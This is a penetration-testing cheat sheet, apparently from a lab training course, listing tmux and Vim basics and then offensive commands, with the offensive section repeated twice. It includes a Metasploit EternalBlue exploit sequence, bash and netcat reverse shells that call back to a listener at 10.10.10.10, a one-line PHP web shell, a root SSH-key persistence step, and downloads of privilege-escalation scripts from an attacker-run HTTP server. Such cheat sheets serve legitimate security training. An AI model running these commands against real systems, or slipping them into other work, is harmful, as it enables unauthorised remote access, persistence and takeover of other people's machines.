Basic Tools

Command	                               Description
	
sudo openvpn user.ovpn	                  Connect to VPN
ifconfig/ip a	                  Show our IP address
netstat -rn	                  Show networks accessible via the VPN
ssh user@10.10.10.10	                  SSH to a remote server
ftp 10.129.42.253	                  FTP to a remote server
tmux	
tmux	                      Start tmux
ctrl+b	                      tmux: default prefix
prefix c	                      tmux: new window
prefix 1	                      tmux: switch to window (1)
prefix shift+%	                      tmux: split pane vertically
prefix shift+"	                      tmux: split pane horizontally
prefix ->	                      tmux: switch to the right pane
Vim	
vim file	                             vim: open file with vim
esc+i	                             vim: enter insert mode
esc	                             vim: back to normal mode
x	                             vim: Cut character
dw	                             vim: Cut word
dd	                             vim: Cut full line
yw	                             vim: Copy word
yy	                             vim: Copy full line
p	                             vim: Paste
:1	                             vim: Go to line number 1.
:w	                             vim: Write the file ‘i.e. save’
:q	                             vim: Quit
:q!	                             vim: Quit without saving
:wq	                             vim: Write and quit










Service Scanning

nmap 10.129.42.253
nmap -sV -sC -p- 10.129.42.253
locate scripts/citrix
nmap --script smb-os-discovery.nse -p445 10.10.10.40
netcat 10.10.10.10 22
smbclient -N -L \\\\10.129.42.253
smbclient \\\\10.129.42.253\\users
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
onesixtyone -c dict.txt 10.129.42.254
Web Enumeration
gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt
gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
curl -IL https://www.inlanefreight.com
whatweb 10.10.10.121
curl 10.10.10.121/robots.txt
ctrl+U
Public Exploits
searchsploit openssh 7.2
msfconsole
search exploit eternalblue
use exploit/windows/smb/ms17_010_psexec
show options
set RHOSTS 10.10.10.40
check
exploit
Using Shells
nc -lvnp 1234
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f
nc 10.10.10.1 1234
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z then stty raw -echo then fg then enter twice
echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php
curl http://SERVER_IP:PORT/shell.php?cmd=id
Privilege Escalation
./linpeas.sh
sudo -l
sudo -u user /bin/echo Hello World!
sudo su -
sudo su user -
ssh-keygen -f key
echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
ssh root@10.10.10.10 -i key
Transferring Files
python3 -m http.server 8000
wget http://10.10.14.1:8000/linpeas.sh
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
scp linenum.sh user@remotehost:/tmp/linenum.sh
base64 shell -w 0
echo f0VMR...SNIO...InmDwU \| base64 -d > shell
md5sum shell




Command                                                                                                          
Service Scanning
nmap 10.129.42.253
nmap -sV -sC -p- 10.129.42.253
locate scripts/citrix
nmap --script smb-os-discovery.nse -p445 10.10.10.40
netcat 10.10.10.10 22
smbclient -N -L \\\\10.129.42.253
smbclient \\\\10.129.42.253\\users
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
onesixtyone -c dict.txt 10.129.42.254
Web Enumeration
gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt
gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
curl -IL https://www.inlanefreight.com
whatweb 10.10.10.121
curl 10.10.10.121/robots.txt
ctrl+U
Public Exploits
searchsploit openssh 7.2
msfconsole
search exploit eternalblue
use exploit/windows/smb/ms17_010_psexec
show options
set RHOSTS 10.10.10.40
check
exploit
Using Shells
nc -lvnp 1234
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f
nc 10.10.10.1 1234
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z then stty raw -echo then fg then enter twice
echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php
curl http://SERVER_IP:PORT/shell.php?cmd=id
Privilege Escalation
./linpeas.sh
sudo -l
sudo -u user /bin/echo Hello World!
sudo su -
sudo su user -
ssh-keygen -f key
echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
ssh root@10.10.10.10 -i key
Transferring Files
python3 -m http.server 8000
wget http://10.10.14.1:8000/linpeas.sh
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
scp linenum.sh user@remotehost:/tmp/linenum.sh
base64 shell -w 0
echo f0VMR...SNIO...InmDwU \| base64 -d > shell
md5sum shell






